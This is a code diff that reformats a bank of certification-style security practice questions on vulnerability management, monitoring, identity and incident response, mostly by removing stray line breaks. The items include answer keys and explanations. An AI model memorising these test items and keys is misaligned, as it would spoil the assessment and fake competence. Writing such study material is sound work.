@@ -46,7 +46,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "After conducting a vulnerability scan, a systems administrator notices that one of the identified\nvulnerabilities is not present on the systems that were scanned.\nWhich of the following describes this example?",
+    "question": "After conducting a vulnerability scan, a systems administrator notices that one of the identified vulnerabilities is not present on the systems that were scanned.\nWhich of the following describes this example?",
     "choices": [
       {
         "key": "A",
@@ -160,7 +160,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A security analyst developed a script to automate a trivial and repeatable task.\nWhich of the following best describes the benefits of ensuring other team members understand\nhow the script works?",
+    "question": "A security analyst developed a script to automate a trivial and repeatable task.\nWhich of the following best describes the benefits of ensuring other team members understand how the script works?",
     "choices": [
       {
         "key": "A",
@@ -245,7 +245,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A Chief Information Security Officer would like to conduct frequent, detailed reviews of systems\nand procedures to track compliance objectives.\nWhich of the following will be the best method to achieve this objective?",
+    "question": "A Chief Information Security Officer would like to conduct frequent, detailed reviews of systems and procedures to track compliance objectives.\nWhich of the following will be the best method to achieve this objective?",
     "choices": [
       {
         "key": "A",
@@ -321,7 +321,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A network engineer deployed a redundant switch stack to increase system availability. However,\nthe budget can only cover the cost of one ISP connection.\nWhich of the following best describes the potential risk factor?",
+    "question": "A network engineer deployed a redundant switch stack to increase system availability. However, the budget can only cover the cost of one ISP connection.\nWhich of the following best describes the potential risk factor?",
     "choices": [
       {
         "key": "A",
@@ -397,7 +397,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "multi",
-    "question": "Easy-to-guess passwords led to an account compromise. The current password policy requires\nat least 12 alphanumeric characters, one uppercase character, one lowercase character, a\npassword history of two passwords, a minimum password age of one day, and a maximum\npassword age of 90 days.\nWhich of the following would reduce the risk of this incident from happening again? (Choose\ntwo.)",
+    "question": "Easy-to-guess passwords led to an account compromise. The current password policy requires at least 12 alphanumeric characters, one uppercase character, one lowercase character, a password history of two passwords, a minimum password age of one day, and a maximum password age of 90 days.\nWhich of the following would reduce the risk of this incident from happening again? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -444,7 +444,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "While performing digital forensics, which of the following is considered the most volatile and\nshould have the contents collected first?",
+    "question": "While performing digital forensics, which of the following is considered the most volatile and should have the contents collected first?",
     "choices": [
       {
         "key": "A",
@@ -482,7 +482,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A systems administrator notices that a testing system is down.\nWhile investigating, the systems administrator finds that the servers are online and accessible\nfrom any device on the server network. The administrator reviews the following information from\nthe monitoring system:\nWhich of the following is the most likely cause of the outage?",
+    "question": "A systems administrator notices that a testing system is down.\nWhile investigating, the systems administrator finds that the servers are online and accessible from any device on the server network. The administrator reviews the following information from the monitoring system:\nWhich of the following is the most likely cause of the outage?",
     "choices": [
       {
         "key": "A",
@@ -520,7 +520,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A security administrator is working to secure company data on corporate laptops in case the\nlaptops are stolen.\nWhich of the following solutions should the administrator consider?",
+    "question": "A security administrator is working to secure company data on corporate laptops in case the laptops are stolen.\nWhich of the following solutions should the administrator consider?",
     "choices": [
       {
         "key": "A",
@@ -558,7 +558,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is a common source of unintentional corporate credential leakage in\ncloud environments?",
+    "question": "Which of the following is a common source of unintentional corporate credential leakage in cloud environments?",
     "choices": [
       {
         "key": "A",
@@ -600,7 +600,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "An analyst is performing a vulnerability scan against the web servers exposed to the internet\nwithout a system account.\nWhich of the following is most likely being performed?",
+    "question": "An analyst is performing a vulnerability scan against the web servers exposed to the internet without a system account.\nWhich of the following is most likely being performed?",
     "choices": [
       {
         "key": "A",
@@ -642,7 +642,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security investigation revealed that malicious software was installed on a server using a\nserver administrator's credentials. During the investigation, the server administrator explained\nthat Telnet was regularly used to log in.\nWhich of the following most likely occurred?",
+    "question": "A security investigation revealed that malicious software was installed on a server using a server administrator's credentials. During the investigation, the server administrator explained that Telnet was regularly used to log in.\nWhich of the following most likely occurred?",
     "choices": [
       {
         "key": "A",
@@ -680,7 +680,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A security administrator is working to find a cost-effective solution to implement certificates for a\nlarge number of domains and subdomains owned by the company.\nWhich of the following types of certificates should the administrator implement?",
+    "question": "A security administrator is working to find a cost-effective solution to implement certificates for a large number of domains and subdomains owned by the company.\nWhich of the following types of certificates should the administrator implement?",
     "choices": [
       {
         "key": "A",
@@ -718,7 +718,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "An auditor discovered multiple insecure ports on some servers. Other servers were found to\nhave legacy protocols enabled.\nWhich of the following tools did the auditor use to discover these issues?",
+    "question": "An auditor discovered multiple insecure ports on some servers. Other servers were found to have legacy protocols enabled.\nWhich of the following tools did the auditor use to discover these issues?",
     "choices": [
       {
         "key": "A",
@@ -756,7 +756,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A security administrator is performing an audit on a stand-alone UNIX server, and the following\nmessage is immediately displayed:\n(Error 13): /etc/shadow: Permission denied.\nWhich of the following best describes the type of tool that is being used?",
+    "question": "A security administrator is performing an audit on a stand-alone UNIX server, and the following message is immediately displayed:\n(Error 13): /etc/shadow: Permission denied.\nWhich of the following best describes the type of tool that is being used?",
     "choices": [
       {
         "key": "A",
@@ -794,7 +794,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "A security administrator needs to create firewall rules for the following protocols: RTP, SIP,\nH.323. and SRTP.\nWhich of the following does this rule set support?",
+    "question": "A security administrator needs to create firewall rules for the following protocols: RTP, SIP, H.323. and SRTP.\nWhich of the following does this rule set support?",
     "choices": [
       {
         "key": "A",
@@ -832,7 +832,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "A company hired an external consultant to assist with required system upgrades to a critical\nbusiness application. A systems administrator needs to secure the consultant's access without\nsharing passwords to critical systems.\nWhich of the following solutions should most likely be utilized?",
+    "question": "A company hired an external consultant to assist with required system upgrades to a critical business application. A systems administrator needs to secure the consultant's access without sharing passwords to critical systems.\nWhich of the following solutions should most likely be utilized?",
     "choices": [
       {
         "key": "A",
@@ -874,7 +874,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "The author of a software package is concerned about bad actors repackaging and inserting\nmalware into the software. The software download is hosted on a website, and the author\nexclusively controls the website's contents.\nWhich of the following techniques would best ensure the software's integrity?",
+    "question": "The author of a software package is concerned about bad actors repackaging and inserting malware into the software. The software download is hosted on a website, and the author exclusively controls the website's contents.\nWhich of the following techniques would best ensure the software's integrity?",
     "choices": [
       {
         "key": "A",
@@ -912,7 +912,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "A security analyst recently read a report about a flaw in several of the organization's printer\nmodels that causes credentials to be sent over the network in cleartext, regardless of the\nencryption settings.\nWhich of the following would be best to use to validate this finding?",
+    "question": "A security analyst recently read a report about a flaw in several of the organization's printer models that causes credentials to be sent over the network in cleartext, regardless of the encryption settings.\nWhich of the following would be best to use to validate this finding?",
     "choices": [
       {
         "key": "A",
@@ -950,7 +950,7 @@ export const domain4Questions = [
     "objective": "4.1",
     "objectiveTitle": "Given a scenario, apply common security techniques to computing resources",
     "type": "single",
-    "question": "A development team is launching a new public-facing web product. The Chief Information\nSecurity Officer has asked that the product be protected from attackers who use malformed or\ninvalid inputs to destabilize the system.\nWhich of the following practices should the development team implement?",
+    "question": "A development team is launching a new public-facing web product. The Chief Information Security Officer has asked that the product be protected from attackers who use malformed or invalid inputs to destabilize the system.\nWhich of the following practices should the development team implement?",
     "choices": [
       {
         "key": "A",
@@ -1026,7 +1026,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is the best resource to consult for information on the most common\napplication exploitation methods?",
+    "question": "Which of the following is the best resource to consult for information on the most common application exploitation methods?",
     "choices": [
       {
         "key": "A",
@@ -1068,7 +1068,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A security analyst is reviewing the logs on an organization's DNS server and notices the\nfollowing unusual snippet:\nWhich of the following attack techniques was most likely used?",
+    "question": "A security analyst is reviewing the logs on an organization's DNS server and notices the following unusual snippet:\nWhich of the following attack techniques was most likely used?",
     "choices": [
       {
         "key": "A",
@@ -1186,7 +1186,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "An organization is adopting cloud services at a rapid pace and now has multiple SaaS\napplications in use. Each application has a separate log-in, so the security team wants to\nreduce the number of credentials each employee must maintain.\nWhich of the following is the first step the security team should take?",
+    "question": "An organization is adopting cloud services at a rapid pace and now has multiple SaaS applications in use. Each application has a separate log-in, so the security team wants to reduce the number of credentials each employee must maintain.\nWhich of the following is the first step the security team should take?",
     "choices": [
       {
         "key": "A",
@@ -1224,7 +1224,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following is a common, passive reconnaissance technique employed by\npenetration testers in the early phases of an engagement?",
+    "question": "Which of the following is a common, passive reconnaissance technique employed by penetration testers in the early phases of an engagement?",
     "choices": [
       {
         "key": "A",
@@ -1262,7 +1262,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "An administrator wants to perform a risk assessment without using proprietary company\ninformation.\nWhich of the following methods should the administrator use to gather information?",
+    "question": "An administrator wants to perform a risk assessment without using proprietary company information.\nWhich of the following methods should the administrator use to gather information?",
     "choices": [
       {
         "key": "A",
@@ -1284,7 +1284,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "Open-source intelligence (OSINT) involves collecting information from publicly available\nsources, such as websites, social media, news articles, and other publicly accessible\ndatabases. OSINT allows an administrator to gather valuable information about potential risks\nwithout using any proprietary or internal company information.",
+    "explanation": "Open-source intelligence (OSINT) involves collecting information from publicly available sources, such as websites, social media, news articles, and other publicly accessible databases. OSINT allows an administrator to gather valuable information about potential risks without using any proprietary or internal company information.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1300,7 +1300,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "An employee used a company's billing system to issue fraudulent checks. The administrator is\nlooking for evidence of other occurrences of this activity.\nWhich of the following should the administrator examine?",
+    "question": "An employee used a company's billing system to issue fraudulent checks. The administrator is looking for evidence of other occurrences of this activity.\nWhich of the following should the administrator examine?",
     "choices": [
       {
         "key": "A",
@@ -1322,7 +1322,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Application logs will contain records of activities within the billing system, including transactions,\nactions taken by users, and any anomalies. This is the most direct source of evidence for\ntracing fraudulent activity within the specific application, such as issuing unauthorized checks.",
+    "explanation": "Application logs will contain records of activities within the billing system, including transactions, actions taken by users, and any anomalies. This is the most direct source of evidence for tracing fraudulent activity within the specific application, such as issuing unauthorized checks.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1364,7 +1364,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "In a BIA, estimating the recovery time of systems, also known as the Recovery Time Objective\n(RTO), is crucial. The BIA process focuses on identifying critical systems, understanding the\nimpact of their unavailability, and determining acceptable downtime. This helps in planning for\nrecovery times, resource allocation, and continuity strategies.",
+    "explanation": "In a BIA, estimating the recovery time of systems, also known as the Recovery Time Objective (RTO), is crucial. The BIA process focuses on identifying critical systems, understanding the impact of their unavailability, and determining acceptable downtime. This helps in planning for recovery times, resource allocation, and continuity strategies.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1402,7 +1402,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "During a vulnerability assessment, scanning or testing can sometimes interfere with normal\nsystem operations, potentially leading to slowdowns, unresponsiveness, or even outages. This\ncan disrupt business operations, especially if the assessment is run on production systems\nwithout adequate precautions or scheduling during low-impact times.",
+    "explanation": "During a vulnerability assessment, scanning or testing can sometimes interfere with normal system operations, potentially leading to slowdowns, unresponsiveness, or even outages. This can disrupt business operations, especially if the assessment is run on production systems without adequate precautions or scheduling during low-impact times.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1440,7 +1440,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "During the post-incident review, the team analyzes the incident to understand its root cause.\nThis phase is focused on learning from the incident, identifying vulnerabilities, and implementing\nimprovements to prevent similar future incidents.",
+    "explanation": "During the post-incident review, the team analyzes the incident to understand its root cause.\nThis phase is focused on learning from the incident, identifying vulnerabilities, and implementing improvements to prevent similar future incidents.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1456,7 +1456,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "Executives at a company are concerned about employees accessing systems and information\nabout sensitive company projects unrelated to the employees' normal job duties.\nWhich of the following enterprise security capabilities will the security team most likely deploy to\ndetect that activity?",
+    "question": "Executives at a company are concerned about employees accessing systems and information about sensitive company projects unrelated to the employees' normal job duties.\nWhich of the following enterprise security capabilities will the security team most likely deploy to detect that activity?",
     "choices": [
       {
         "key": "A",
@@ -1478,7 +1478,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "UBA helps detect unusual or unauthorized access patterns by analyzing user behavior and\nidentifying deviations from typical access patterns. It can alert the security team when\nemployees attempt to access systems or data unrelated to their job duties, which addresses the\nexecutives' concern about potential insider threats or policy violations related to sensitive\nprojects.",
+    "explanation": "UBA helps detect unusual or unauthorized access patterns by analyzing user behavior and identifying deviations from typical access patterns. It can alert the security team when employees attempt to access systems or data unrelated to their job duties, which addresses the executives' concern about potential insider threats or policy violations related to sensitive projects.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1516,7 +1516,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Input sanitization ensures that any user-supplied data is properly filtered and cleaned before\nbeing processed by the application. By sanitizing inputs, the system can prevent malicious\ncommand injection attempts like the one shown in the log entry.",
+    "explanation": "Input sanitization ensures that any user-supplied data is properly filtered and cleaned before being processed by the application. By sanitizing inputs, the system can prevent malicious command injection attempts like the one shown in the log entry.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1532,7 +1532,7 @@ export const domain4Questions = [
     "objective": "4.6",
     "objectiveTitle": "Given a scenario, implement and maintain identity and access management",
     "type": "single",
-    "question": "An organization has recently decided to implement SSO. The requirements are to leverage\naccess tokens and focus on application authorization rather than user authentication.\nWhich of the following solutions would the engineering team most likely configure?",
+    "question": "An organization has recently decided to implement SSO. The requirements are to leverage access tokens and focus on application authorization rather than user authentication.\nWhich of the following solutions would the engineering team most likely configure?",
     "choices": [
       {
         "key": "A",
@@ -1554,7 +1554,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "OAuth is designed for authorization rather than authentication. It uses access tokens to grant\napplications permission to access resources on behalf of a user, focusing on what the\napplication can do with the user's data rather than verifying the user's identity. This makes\nOAuth a suitable choice for Single Sign-On (SSO) when the focus is on application\nauthorization.",
+    "explanation": "OAuth is designed for authorization rather than authentication. It uses access tokens to grant applications permission to access resources on behalf of a user, focusing on what the application can do with the user's data rather than verifying the user's identity. This makes OAuth a suitable choice for Single Sign-On (SSO) when the focus is on application authorization.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1570,7 +1570,7 @@ export const domain4Questions = [
     "objective": "4.7",
     "objectiveTitle": "Explain the importance of automation and orchestration related to secure operations",
     "type": "single",
-    "question": "A security engineer would like to enhance the use of automation and orchestration within the\nSIEM.\nWhich of the following would be the primary benefit of this enhancement?",
+    "question": "A security engineer would like to enhance the use of automation and orchestration within the SIEM.\nWhich of the following would be the primary benefit of this enhancement?",
     "choices": [
       {
         "key": "A",
@@ -1592,7 +1592,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "By automating repetitive tasks and orchestrating responses to common security incidents, the\nSIEM can handle more work without requiring additional personnel. This enhancement allows\nthe security team to be more efficient, respond faster, and focus on more complex tasks,\neffectively multiplying the impact of the existing workforce.",
+    "explanation": "By automating repetitive tasks and orchestrating responses to common security incidents, the SIEM can handle more work without requiring additional personnel. This enhancement allows the security team to be more efficient, respond faster, and focus on more complex tasks, effectively multiplying the impact of the existing workforce.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1608,7 +1608,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "single",
-    "question": "An organization issued new laptops to all employees and wants to provide web filtering both in\nand out of the office without configuring additional access to the network.\nWhich of the following types of web filtering should a systems administrator configure?",
+    "question": "An organization issued new laptops to all employees and wants to provide web filtering both in and out of the office without configuring additional access to the network.\nWhich of the following types of web filtering should a systems administrator configure?",
     "choices": [
       {
         "key": "A",
@@ -1630,7 +1630,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "An agent-based web filtering solution installs a software agent directly on the laptops. This\napproach allows the filtering to work regardless of the device's location (in or out of the office)\nwithout requiring additional network configuration. The agent enforces web filtering policies\nlocally on each laptop, ensuring consistent protection across various network environments.",
+    "explanation": "An agent-based web filtering solution installs a software agent directly on the laptops. This approach allows the filtering to work regardless of the device's location (in or out of the office) without requiring additional network configuration. The agent enforces web filtering policies locally on each laptop, ensuring consistent protection across various network environments.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1646,7 +1646,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "Which of the following should be used to aggregate log data in order to create alerts and detect\nanomalous activity?",
+    "question": "Which of the following should be used to aggregate log data in order to create alerts and detect anomalous activity?",
     "choices": [
       {
         "key": "A",
@@ -1668,7 +1668,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A SIEM solution collects and aggregates log data from various sources across the network,\nenabling real-time monitoring, correlation, and alerting on security events. It is designed to\ndetect anomalous activity and provide insights into potential security incidents by analyzing\npatterns and behaviors across the log data.",
+    "explanation": "A SIEM solution collects and aggregates log data from various sources across the network, enabling real-time monitoring, correlation, and alerting on security events. It is designed to detect anomalous activity and provide insights into potential security incidents by analyzing patterns and behaviors across the log data.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1706,7 +1706,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "MDM allows an organization to remotely manage, monitor, and secure mobile devices used by\nemployees, especially when they contain company data. With MDM, administrators can enforce\nsecurity policies, remotely lock or wipe lost or stolen devices, and ensure compliance with data\nprotection policies, thereby mitigating the risk of data loss.",
+    "explanation": "MDM allows an organization to remotely manage, monitor, and secure mobile devices used by employees, especially when they contain company data. With MDM, administrators can enforce security policies, remotely lock or wipe lost or stolen devices, and ensure compliance with data protection policies, thereby mitigating the risk of data loss.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1722,7 +1722,7 @@ export const domain4Questions = [
     "objective": "4.2",
     "objectiveTitle": "Explain the security implications of proper hardware, software, and data asset management",
     "type": "single",
-    "question": "An IT administrator needs to ensure data retention standards are implemented on an enterprise\napplication.\nWhich of the following describes the administrator's role?",
+    "question": "An IT administrator needs to ensure data retention standards are implemented on an enterprise application.\nWhich of the following describes the administrator's role?",
     "choices": [
       {
         "key": "A",
@@ -1744,7 +1744,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "A custodian is responsible for the implementation and enforcement of data management\npolicies, including data retention standards, on systems and applications. Custodians manage\nthe technical aspects of data storage and maintenance according to the organization's policies\nand standards, supporting the data owner's requirements.",
+    "explanation": "A custodian is responsible for the implementation and enforcement of data management policies, including data retention standards, on systems and applications. Custodians manage the technical aspects of data storage and maintenance according to the organization's policies and standards, supporting the data owner's requirements.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1760,7 +1760,7 @@ export const domain4Questions = [
     "objective": "4.5",
     "objectiveTitle": "Given a scenario, modify enterprise capabilities to enhance security",
     "type": "multi",
-    "question": "A company plans to secure its systems by:\n• Preventing users from sending sensitive data over corporate email\n• Restricting access to potentially harmful websites\nWhich of the following features should the company set up? (Choose two.)",
+    "question": "A company plans to secure its systems by:\n• Preventing users from sending sensitive data over corporate email\n• Restricting access to potentially harmful websites Which of the following features should the company set up? (Choose two.)",
     "choices": [
       {
         "key": "A",
@@ -1791,7 +1791,7 @@ export const domain4Questions = [
       "A",
       "B"
     ],
-    "explanation": "DLP (Data Loss Prevention) software: DLP helps prevent users from sending sensitive data\nover corporate email by monitoring and controlling the flow of sensitive information. DNS\nfiltering: DNS filtering restricts access to potentially harmful websites by blocking access to sites\nbased on their domain names, helping to protect users from malicious or inappropriate content.",
+    "explanation": "DLP (Data Loss Prevention) software: DLP helps prevent users from sending sensitive data over corporate email by monitoring and controlling the flow of sensitive information. DNS filtering: DNS filtering restricts access to potentially harmful websites by blocking access to sites based on their domain names, helping to protect users from malicious or inappropriate content.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1829,7 +1829,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "Log correlation involves analyzing and linking data from multiple sources to identify patterns,\ntrends, or sequences of events that indicate potential security incidents or malicious activity.\nThis process helps security teams detect complex threats that may not be evident from\nindividual logs alone.",
+    "explanation": "Log correlation involves analyzing and linking data from multiple sources to identify patterns, trends, or sequences of events that indicate potential security incidents or malicious activity.\nThis process helps security teams detect complex threats that may not be evident from individual logs alone.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1845,7 +1845,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "A security analyst attempts to start a company's database server.\nWhen the server starts, the analyst receives an error message indicating the database server\ndid not pass authentication. After reviewing and testing the system, the analyst receives\nconfirmation that the server has been compromised and that attackers have redirected all\noutgoing database traffic to a server under their control.\nWhich of the following MITRE ATT&CK techniques did the attacker most likely use to redirect\ndatabase traffic?",
+    "question": "A security analyst attempts to start a company's database server.\nWhen the server starts, the analyst receives an error message indicating the database server did not pass authentication. After reviewing and testing the system, the analyst receives confirmation that the server has been compromised and that attackers have redirected all outgoing database traffic to a server under their control.\nWhich of the following MITRE ATT&CK techniques did the attacker most likely use to redirect database traffic?",
     "choices": [
       {
         "key": "A",
@@ -1883,7 +1883,7 @@ export const domain4Questions = [
     "objective": "4.4",
     "objectiveTitle": "Explain security alerting and monitoring concepts and tools",
     "type": "single",
-    "question": "Which of the following enables the ability to receive a consolidated report from different devices\non the network?",
+    "question": "Which of the following enables the ability to receive a consolidated report from different devices on the network?",
     "choices": [
       {
         "key": "A",
@@ -1905,7 +1905,7 @@ export const domain4Questions = [
     "correct": [
       "C"
     ],
-    "explanation": "SIEM (Security Information and Event Management) systems aggregate and analyze log data\nfrom various devices across a network, enabling the collection, correlation, and analysis of\nsecurity-related events. SIEM provides a consolidated report of activities, helping to identify\npotential security incidents by correlating data from multiple sources, which enhances visibility\nand response capabilities across the network.",
+    "explanation": "SIEM (Security Information and Event Management) systems aggregate and analyze log data from various devices across a network, enabling the collection, correlation, and analysis of security-related events. SIEM provides a consolidated report of activities, helping to identify potential security incidents by correlating data from multiple sources, which enhances visibility and response capabilities across the network.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1921,7 +1921,7 @@ export const domain4Questions = [
     "objective": "4.3",
     "objectiveTitle": "Explain various activities associated with vulnerability management",
     "type": "single",
-    "question": "Which of the following should an organization focus on the most when making decisions about\nvulnerability prioritization?",
+    "question": "Which of the following should an organization focus on the most when making decisions about vulnerability prioritization?",
     "choices": [
       {
         "key": "A",
@@ -1943,7 +1943,7 @@ export const domain4Questions = [
     "correct": [
       "B"
     ],
-    "explanation": "The Common Vulnerability Scoring System (CVSS) is a widely used standard that provides a\nnumerical score reflecting the severity of a vulnerability. Organizations use CVSS scores to\nprioritize vulnerabilities based on their potential impact and exploitability, which helps in\nassessing which vulnerabilities need urgent remediation. This approach enables systematic\nvulnerability prioritization based on quantifiable metrics.",
+    "explanation": "The Common Vulnerability Scoring System (CVSS) is a widely used standard that provides a numerical score reflecting the severity of a vulnerability. Organizations use CVSS scores to prioritize vulnerabilities based on their potential impact and exploitability, which helps in assessing which vulnerabilities need urgent remediation. This approach enables systematic vulnerability prioritization based on quantifiable metrics.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -1981,7 +1981,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "A tabletop exercise is a discussion-based exercise where participants walk through different\nscenarios to better understand and familiarize themselves with the incident response process.\nThis type of exercise allows teams to review roles, procedures, and potential responses to\nvarious incidents in a low-stress environment, enhancing preparedness and coordination.",
+    "explanation": "A tabletop exercise is a discussion-based exercise where participants walk through different scenarios to better understand and familiarize themselves with the incident response process.\nThis type of exercise allows teams to review roles, procedures, and potential responses to various incidents in a low-stress environment, enhancing preparedness and coordination.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2019,7 +2019,7 @@ export const domain4Questions = [
     "correct": [
       "D"
     ],
-    "explanation": "Privileged Access Management (PAM) is the best way to secure shared, privileged accounts\nlike a backup account, especially in cases of Single Sign-On (SSO) failure. PAM solutions\nprovide strict controls over access to sensitive accounts, enforce logging and monitoring, and\noften include features like session recording and access expiration. This approach ensures that\naccess to the backup account remains secure even when other authentication methods, like\nSSO, are unavailable.",
+    "explanation": "Privileged Access Management (PAM) is the best way to secure shared, privileged accounts like a backup account, especially in cases of Single Sign-On (SSO) failure. PAM solutions provide strict controls over access to sensitive accounts, enforce logging and monitoring, and often include features like session recording and access expiration. This approach ensures that access to the backup account remains secure even when other authentication methods, like SSO, are unavailable.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2035,7 +2035,7 @@ export const domain4Questions = [
     "objective": "4.8",
     "objectiveTitle": "Explain appropriate incident response activities",
     "type": "single",
-    "question": "Which of the following elements of digital forensics should a company use if it needs to ensure\nthe integrity of evidence?",
+    "question": "Which of the following elements of digital forensics should a company use if it needs to ensure the integrity of evidence?",
     "choices": [
       {
         "key": "A",
@@ -2057,7 +2057,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
-    "explanation": "Preservation is the process in digital forensics that ensures the integrity of evidence by\nmaintaining it in its original, unaltered state. This involves safeguarding data against\nmodification or tampering throughout the investigation process, ensuring that the evidence\nremains reliable and admissible in court if needed.",
+    "explanation": "Preservation is the process in digital forensics that ensures the integrity of evidence by maintaining it in its original, unaltered state. This involves safeguarding data against modification or tampering throughout the investigation process, ensuring that the evidence remains reliable and admissible in court if needed.",
     "explanationSource": "pdf",
     "incorrectExplanations": {},
     "references": [],
@@ -2073,7 +2073,7 @@ export const domain4Questions = [
     "objective": "4.9",
     "objectiveTitle": "Given a scenario, use data sources to support an investigation",
     "type": "single",
-    "question": "A company suffered a critical incident where 30GB of data was exfiltrated from the corporate\nnetwork.\nWhich of the following actions is the most efficient way to identify where the system data was\nexfiltrated from and what location the attacker sent the data to?",
+    "question": "A company suffered a critical incident where 30GB of data was exfiltrated from the corporate network.\nWhich of the following actions is the most efficient way to identify where the system data was exfiltrated from and what location the attacker sent the data to?",
     "choices": [
       {
         "key": "A",
@@ -2095,7 +2095,7 @@ export const domain4Questions = [
     "correct": [
       "A"
     ],
